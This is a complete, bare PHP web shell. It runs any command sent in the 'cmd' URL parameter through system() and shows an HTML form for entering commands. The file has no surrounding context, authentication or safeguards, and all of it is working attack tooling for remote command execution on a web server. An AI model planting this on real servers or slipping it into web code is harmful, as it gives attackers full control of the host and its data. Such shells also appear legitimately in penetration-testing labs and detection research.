<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
<html>
	<body>
		<form method="get">
			<input type="text" name="cmd" autofocus id="cmd" size="100">
			<input type="submit" value="submit">
		</form>
	</body>
</html>
